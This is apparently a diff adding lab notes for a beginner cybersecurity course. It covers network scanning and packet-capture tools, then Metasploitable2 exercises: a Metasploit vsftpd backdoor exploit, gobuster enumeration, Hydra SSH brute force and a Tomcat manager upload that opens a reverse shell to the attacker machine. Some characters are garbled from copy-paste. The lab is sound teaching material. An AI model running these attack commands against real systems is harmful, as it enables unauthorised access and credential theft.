@@ -1,0 +1,126 @@
+ Theory Recap 
+Key Concepts:
+* IP Address: Unique identifier for a device on a network
+* Ports: Logical endpoints (e.g., port 80 = HTTP)
+* Protocols:
+o TCP – reliable, connection-based (uses 3-way handshake)
+o UDP – faster, no handshake
+* 3-Way Handshake (TCP):
+markdown
+CopyEdit
+1. SYN ?  2. SYN-ACK ? 3. A
+??? 1. Nmap for Network Scanning
+?? Goal: Discover live hosts, open ports, and services.
+Install Nmap
+bash
+CopyEdit
+sudo apt update
+sudo apt install nmap
+Basic Commands:
+* Ping scan (check which hosts are up):
+bash
+CopyEdit
+nmap -sn 192.168.1.0/24
+* Scan specific host with default options:
+nmap 192.168.1.10
+* Scan for specific ports:
+nmap -p 22,80,443 192.168.1.10
+* Service version detection:
+nmap -sV 192.168.1.10
+* Aggressive scan (OS + version detection):
+nmap -A 192.168.1.10
+Use man nmap to learn more options.
+
+ 2. Passive Recon with whois, nslookup, theHarvester
+ Goal: Gather info about domains without touching the target server directly.
+whois
+bash
+CopyEdit
+whois example.com
+ Output: Owner, registrar, contact details.
+
+nslookup
+nslookup example.com
+ Output: IP addresses and DNS records.
+
+theHarvester
+Install:
+sudo apt install theharvester
+ Example:
+theharvester -d example.com -l 100 -b bing
+Finds emails, hosts, and subdomains from public sources.
+
+ 3. Packet Capture with Wireshark
+ Goal: Observe live network traffic
+Open Wireshark
+sudo wireshark
+Steps:
+1. Select your network interface (e.g., eth0, wlan0)
+2. Click Start Capture
+3. Visit a website in browser
+4. Stop capture
+ Use filter: http or tcp.port == 80
+ Right-click ? Follow TCP stream ? See entire conversation
+
+4. tcpdump for CLI packet capture
+Goal: CLI-based packet capture and analysis
+Basic Capture:
+sudo tcpdump -i eth0
+Filter HTTP traffic:
+sudo tcpdump -i eth0 port 80
+Save to file for Wireshark:
+sudo tcpdump -i eth0 -w output.pcap
+?? Open output.pcap in Wireshark later:
+wireshark output.pcap
+
+
+ Cybersecurity Lab Exercises – Metasploitable2 using Metasploit
+
+This repository contains beginner-friendly hands-on **penetration testing exercises** using **Kali Linux**, **Metasploitable2**, and the **Metasploit Framework**. These labs help students learn how vulnerabilities are exploited in real-world scenarios.
+
+---
+
+## Lab Setup Requirements
+
+Kali Linux (attacker machine)
+Metasploitable2 (vulnerable target machine)
+Same VirtualBox/VMware network (Host-Only or NAT)
+Tools Used: `msfconsole`, `nmap`, `hydra`, `gobuster`, `telnet`, `netdiscover`, `dvwa`
+
+
+##  Lab Exercises
+
+###  Exercise 1: Discover Target Machine (Network Scanning)
+netdiscover -r 192.168.56.0/24
+Goal: Identify the IP address of the Metasploitable2 machine.
+
+Exercise 2: Scan Open Ports and Services
+nmap -sS -sV <TARGET_IP>
+Goal: Find open ports and detect service versions.
+
+Exercise 3: Exploit FTP (vsftpd 2.3.4)
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST <TARGET_IP>
+run
+Goal: Get a remote shell via vulnerable FTP server.
+
+Exercise 4: Web Directory Enumeration
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
+Goal: Discover hidden web folders like /phpmyadmin/, /dvwa/.
+
+Exercise 5: SSH Brute-force Attack
+hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
+Goal: Crack the SSH login password using brute-force.
+
+Exercise 6: Exploit Tomcat Manager
+use exploit/multi/http/tomcat_mgr_upload
+set RHOST <TARGET_IP>
+set RPORT 8180
+set HttpUsername tomcat
+set HttpPassword tomcat
+set LHOST <KALI_IP>
+run
+Goal: Upload reverse shell via Tomcat and gain access.
+
